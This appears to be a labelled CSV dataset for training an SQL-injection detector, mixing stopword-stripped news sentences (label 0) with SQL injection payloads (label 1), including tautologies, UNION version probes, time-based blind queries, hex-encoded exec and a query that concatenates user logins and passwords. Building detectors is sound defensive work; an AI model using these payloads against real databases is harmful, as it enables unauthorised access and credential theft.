Sentence,Label
"select * from users where id = 1 or @`\` union select 1,version (  )  -- 1",1
Leg almost hacked off: Rocker retrial A bloody attack within &apos; Rocker &apos; scene re-investigated four years,0
"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1
( sqlattempt2 ),1
"select * from users where id = 1 or 1#"", union select version (  ) ,version (  )  -- 1",1
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login >,1
"select * from users where id = 1.&&1 union select 1,version (  )  -- 1",1
or 'whatever' in  ( 'whatever' ),1
There also plant alternatives eggs,0
"A board member German blue-chip company concurred comes economic espionage , &quot; French worst",0
The vehicles collided,0
"The historic , one hundred-year-old boundary wall old school-yard Kirchstrasse need renovation , primarily result water frost damage , account lack drainage , leaning forwards",0
No longer newborns rigidly assigned male female,0
"So God armed youth puberty manhood less piquancy charm, made enviable gracious claims put by, stand itself",0
"&quot; The meeting takes place Town Hall , center Manhattan",0
"Kendrick Johnson , Valdosta , Ga",0
They probably even know term even means,0
"In 2009 leases Circular Quay enterprises , earned Obeids $ 2",0
or 'text' > 't',1
"If I know sect, I anticipate argument",0
"Soya , oat , almond rice milk used place milk",0
admin' )  or  ( '1' = '1'/*,1
a' or 1 = 1; --,1
"This Friday evening , &quot; Pump party &quot; event taking place , one day later , Saturday evening , festivities continue over-25s party",0
0 or 1 = 1,1
"His arrival greeted chants , &quot; The army people one hand , &quot; hundreds gathered university &apos;s main lecture room",0
"The Committees Haslach pastoral care unit set answer questions regarding future composition size joint Parish Council , practical work church community teams",0
"But work, I shall know you",0
"Even wood &quot; Kuhbach &quot; area occasionally transported via route , vehicles , measure 20 metres length , would able use route via Häberles Bridge , would able make turn Hauptstrasse",0
Tickets available ticket office Nuclear Bunker Museum,0
"There &apos;s also money walk-in clinics Hobart Launceston , better after-hospital care , medical specialist training , mental health services rollout personal electronic health record systems local hospitals",0
"We love pay homage, trap love homage, selfdependent, self-derived, therefore old immaculate pedigree, even shown young person",0
A great man coming eat house,0
Electricity become expensive Pfullendorf The citizens Pfullendorf adjust high electricity costs,0
"In separate move , Ofqual , exams regulator , unveil shake-up structure GCSEs , new grading system less coursework",0
"admin"" )  or ""1"" = ""1",1
0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ),1
"Lowndes County sheriff &apos;s investigators concluded Johnson died freak accident , 17-year-old &apos;s family disputes",0
select * from users where id = 1 %$ . or 1 = 1 -- 1,1
"admin"" #",1
US authorities described four foot three foot tunnel one sophisticated secret passages ever discovered,0
"The training data used models adapted Treebank data excluding punctuations keeping punctuation contexts, simulate unavailable annotated transcribed speech texts",0
"or 1 = 1 or """" =",1
The charges filed US justice department include espionage theft government property,0
Martin told CNN asked Daley whether then-boss knew potential shuffle,0
"But , many challenging ethical basis surgery , knowing gender identity complex , doctors sometimes get wrong , knowing child feel gender assignment grow",0
The judge ruled police officers violated civil rights tens thousands people wrongly targeting black Hispanic men stop-and-frisk program,0
"This levy reset four operators large power grids , October year",0
"In clubhouse &quot; Witteborg &quot; Inn Dinker , present enjoyed friendly get-together name music",0
This year became European Champion special discipline,0
According Green Party MP,0
But stats show I &apos;m black sheep comes Halloween,0
For Matthias Schrell plans location,0
"Rapist South Africa: two life sentences Nine months brutal rape mutilation 17-year-old girl South Africa , perpetrator condemned two life sentences Friday",0
"To get 20 years , killing 202 people injuring many hundreds , &apos;s much",0
"Rainer Prewo , former Lord Mayor Nagold , made suggestion equipping vehicle photovoltaic system , according Henne , planning assume advisory role within organisation",0
"Helping others live happier lives , fulfilling promise made father , something brings great joy",0
"When became clear much money wasted , decided help Africans controlling budget people",0
Airlines pay online travel sellers Orbitz $ 10 $ 25 ticket sold,0
""" or benchmark ( 10000000,MD5 ( 1  )  )  #",1
"These features manifest secondary sexual characteristics , muscle mass , hair distribution , breasts stature; primary sexual characteristics reproductive organs genitalia; chromosomal structures hormones",0
"&quot; Now Francis selected eight cardinals help , &quot; Valero said",0
"Even case rental apartments landlords work carried , even matter raising level toilet seat , clarified interior designer",0
"&quot; They &apos;re experienced racers , people looking excitement adventure , achievable path towards world-class events",0
"Supreme Court upholds Obama health care law In major victory Obama administration , US Supreme Court today ruled Barack Obama &apos;s signature health care law constitutional",0
"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
"Brazil &apos;s Embraer SA , world &apos;s third-largest commercial planemaker Bombardier &apos;s closest rival , reported 10 percent fall quarterly profit Thursday",0
Guests also invited take part tombola impressive prizes sample delicious food cafeteria,0
"On hand , analysts say full 10-seat-per-row cabins existing 777s suggest many passengers voting denser layout , may go hand hand cheaper fares",0
"With euro crisis , Project Europe officially dead",0
"The catastrophes Catholic village upbringing - speechlessness , tendency towards brute force dulled sexuality , confinement lack joy - described many times Kaernten-born poet",0
admin' or ',1
"My sister I allowed eat candy , stay late play dress-up neighborhood",0
"select * from users where id = '1'<@$$ union select 1,version (  )  -- 1'",1
""" )  or pg_sleep ( __TIME__ ) --",1
"Once psychiatric expert cast considerable doubt suffering psychiatric condition , thus limited culpability , 33-year-old made full confession",0
"The prizes placed , covered , table humorously paraphrased prior presented winners",0
They read time streams,0
"select * from users where id = 1 +  ( \. )  union select null,@@VERSION -- 1",1
"select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1
declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...,1
"select * from users where id = 1 or "",;"" or 1 = 1 -- 1",1
A spokesman annual horse show said: &quot; Fenton three knows handle pony,0
"’ Rough graceless would greeting, truth handsomer affectation love",0
"fix seatbacks General Motors Co recalling nearly 19,000 all-new 2014 Chevrolet Silverado GMC Sierra pickup trucks repair problem manual reclining seatback , according notice U",0
"&quot; In addition , wait see whether reinforcements first team , &quot; explained SG coach",0
"However , first time cocaine found tunnel construction",0
Saturday 10: 00 a,0
"He gives life organization , desire help Cameroon people everlasting",0
or 3 = 3,1
"The group -- mix Cameroonian doctors foreign medical students -- performed 700 free surgeries past year , know help make world difference help",0
The investigation came conclusion could ruled inclination road could result longer vehicles becoming stuck,0
"select * from users where id = '1' union select $ .,@@VERSION -- 1'",1
"""a"""" or 3 = 3--""",1
Scientists shed light movements dog &apos;s tail linked mood,0
select * from users where id = 1 + ( \ )  or 1 = 1 -- 1,1
"In evening , fans brass band music treat",0
The new vaccine contains harmless virus engineered carry genetic information make anti-nicotine antibodies,0
The technology,0
"For training exercise , department commander , Hans Kammerer , chose Feder premises Burgberger Strasse",0
"select * from users where id = 1 or @#"" (  = 1 or 1 = 1 -- 1",1
"&quot; The boarding process smoothest I seen airline career , &quot; said",0
"select * from users where id = 1 or "".#"" or 1 = 1 -- 1",1
Aircraft electronic device rules stay force Australia Australian airline passengers need continue turning tablets smart phones take-off landing despite moves US loosen regulations covering devices,0
"select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1
"Mozambique security concerns mount powerful personalities clash With statue Samora Machel , Mozambique &apos;s founding president , staring , thousands people gathered central Maputo chant peace slogans rare public demonstration",0
"&quot; They worry risk pregnancy even handle hygiene , &quot; said Kaplowitz",0
"From parish , least two elected members represented , so-called church community teams set on-site six parishes",0
"Pope Francis name first cardinals February Pope Francis create new cardinals Catholic Church first time February 22 , Vatican announced Thursday",0
"Only several hundred supporters gathered outside court cheer new president , departure presidential pomp Mubarak years , traffic briefly halted allow motorcade usually busy road linking city centre southern suburbs",0
In June government revised estimated cost building high-speed link London North England £ 32,0
"Act singly, already done singly justify now",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
There major reason change anything,0
zip 201704/00001491530253354,0
"select * from users where id = '1' union select  ( \. ) ,@@VERSION -- 1'",1
"select * from users where id = 1 or @#"" (  = 1 union select 1,version (  )  -- 1",1
"According police , autopsy showed evidence capital offence",0
char%4039%41%2b%40SELECT,1
"Chief Justice John Roberts sided four liberal members court Justices Scalia , Thomas , Alito Kennedy dissented",0
1 )  or sleep ( __TIME__ ) #,1
"&quot; People think ones responsible future country government president , one find solutions problems , &quot; says",0
+sqlvuln,1
select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1
